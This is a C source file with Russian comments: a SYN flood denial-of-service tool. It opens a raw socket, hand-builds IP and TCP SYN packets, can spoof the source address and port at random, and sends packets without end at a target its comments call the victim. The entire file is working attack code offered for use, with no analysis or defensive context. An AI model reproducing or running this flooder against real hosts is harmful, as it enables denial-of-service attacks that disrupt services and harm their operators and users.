#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <netdb.h>

/*--------------------------------------*/
/* Преобразование имени узла в IP-адрес */
/*--------------------------------------*/
unsigned long resolve(char *hostname)
{
  struct hostent *hp;

  if ( (hp = gethostbyname(hostname)) == NULL) {
    herror("gethostbyname() failed");
    exit(-1);
  }

  return *(unsigned long *)hp->h_addr_list[0];
}

/*------------------------------*/
/* Вычисление контрольной суммы */
/*------------------------------*/
unsigned short in_cksum(unsigned short *addr, int len)
{
  unsigned short result;
  unsigned int sum = 0;
  
  /* складываем все двухбайтовые слова */
  while (len > 1)
 {
    sum += *addr++;
    len -= 2;
  }

  /* если остался лишний байт, прибавляем его к сумме */
  if (len == 1)
    sum += *(unsigned char*) addr;
    
  sum=(sum >> 16) + (sum & 0xFFFF);
 /* добавляем перенос */
  sum += (sum >> 16);
               /* еще раз */
  result = ~sum;
                    /* инвертируем результат */
  return result;
}

/*--------------------------------*/
/* Формирование и отправка пакета */
/*--------------------------------*/
sendpacket(int sockd, unsigned long srcaddr, 
		 unsigned long dstaddr, 
		 int sport, 
		 int dport)
{

  struct sockaddr_in servaddr;

  /* структура псевдозаголовка */
  struct pseudohdr
  {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char place_holder;
    unsigned char protocol;
    unsigned short length;    
  } pseudo_hdr;

  char sendbuf[sizeof(struct iphdr) + sizeof(struct tcphdr)];
  struct iphdr *ip_hdr = (struct iphdr *) sendbuf;
  struct tcphdr *tcp_hdr = (struct tcphdr *) (sendbuf + sizeof(struct iphdr));
  unsigned char *
pseudo_packet; /* указатель на псевдопакет */

  /* заполняем IP-заголовок */
  ip_hdr->ihl = 5;
  ip_hdr->version = 4;
  ip_hdr->tos = 0;
  ip_hdr->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
  ip_hdr->id = 0;
  ip_hdr->frag_off = 0;
  ip_hdr->ttl = 255;
  ip_hdr->protocol = IPPROTO_TCP;
  ip_hdr->check = 0;
  ip_hdr->check = in_cksum((unsigned short *)ip_hdr, sizeof(struct iphdr));
  ip_hdr->saddr = srcaddr;
  ip_hdr->daddr = dstaddr;

  /* заполняем псевдозаголовок */
  pseudo_hdr.source_address = srcaddr;
  pseudo_hdr.dest_address = dstaddr;
  pseudo_hdr.place_holder = 0;
  pseudo_hdr.protocol = IPPROTO_TCP;
  pseudo_hdr.length = htons(sizeof(struct tcphdr));

  /* заполняем TCP-заголовок */
  tcp_hdr->source = htons(sport);
  tcp_hdr->dest = htons(dport);
  tcp_hdr->seq = htons(getpid());
  tcp_hdr->ack_seq = 0;
  tcp_hdr->res1 = 0;
  tcp_hdr->doff = 5;
  tcp_hdr->fin = 0;
  tcp_hdr->syn = 1;
  tcp_hdr->rst = 0;
  tcp_hdr->psh = 0;
  tcp_hdr->ack = 0;
  tcp_hdr->urg = 0;
  tcp_hdr->ece = 0;
  tcp_hdr->cwr = 0;
  tcp_hdr->window = htons(128);
  tcp_hdr->check = 0;
  tcp_hdr->urg_ptr = 0;

  /* выделяем место в памяти для формирования псевдопакета */
  if ( (pseudo_packet = (char*)malloc(sizeof(pseudo_hdr) + 
       sizeof(struct tcphdr))) == NULL) {
    perror("malloc() failed");
    exit(-1);
  }

  /* копируем псевдозаголовок в начало псевдопакета */
  memcpy(pseudo_packet, &pseudo_hdr, sizeof(pseudo_hdr));
  
  /* затем копируем TCP-заголовок */
  memcpy(pseudo_packet + sizeof(pseudo_hdr), sendbuf + 
	 sizeof(struct iphdr), sizeof(struct tcphdr));

  /* теперь можно вычислить контрольную сумму в TCP-заголовке */
  tcp_hdr->check = in_cksum((unsigned short *)pseudo_packet, 
                   sizeof(pseudo_hdr) + sizeof(struct tcphdr));

  bzero(&servaddr, sizeof(servaddr));
  servaddr.sin_family = AF_INET;
  servaddr.sin_port = htons(dport);
  servaddr.sin_addr.s_addr = dstaddr;

  /* отправляем пакет */
  if (sendto(sockd, 
 	     sendbuf,
	     sizeof(sendbuf), 
	     0, 
	     (struct sockaddr *)&servaddr, 
	     sizeof(servaddr)) < 0) {
    perror("sendto() failed");
    exit(-1);
  }

}

/*------------------------*/

/* Главная функция main() */
/*------------------------*/
int main(int argc, char *argv[])
{
  int sd;
  const int on = 1;
  unsigned long ip_src, ip_dst;
  int port_src, port_dst;
  int rnd_ip = 0;
  int rnd_port = 0;  

  if (argc != 5)
 {
    fprintf(stderr,
    "Usage: %s <source address | random> <source port | random> <destination address> <destination port>\n", 
    argv[0]);
    exit(-1);
  }

  /* создаем raw-сокет */
  if ( (sd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
 {
    perror("socket() failed");
    exit(-1);
  }

  /* так как будем самостоятельно заполнять IP-заголовок, то 
  устанавливаем опцию IP_HDRINCL */
  if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0)
 {
    perror("setsockopt() failed");
    exit(-1);
  }
  
  /* если в первом аргументе командной строки указано random, то
  IP-адрес источника выбирается случайным образом */
  if (!strcmp(argv[1], "random")) {
    rnd_ip = 1;
    ip_src = random();
  } else
    ip_src = resolve(argv[1]);

  /* если во втором аргументе командной строки указано random, то
  порт источника выбирается случайным образом */
  if (!strcmp(argv[2], "random")) {
    rnd_port = 1;
    port_src = rand() % 65536;
  } else
    port_src = atoi(argv[2]);
  
  /* IP-адрес жертвы */

  ip_dst = resolve(argv[3]);

  /* порт жертвы */
  port_dst = atoi(argv[4]);

  /* в бесконечном цикле отправляем пакеты */
  while(1) {
    sendpacket(sd, ip_src, ip_dst, port_src, port_dst);
    if (rnd_ip)
      ip_src = random();
    if (rnd_port)
      port_src = rand() % 65536;
  }

  return 0;
}

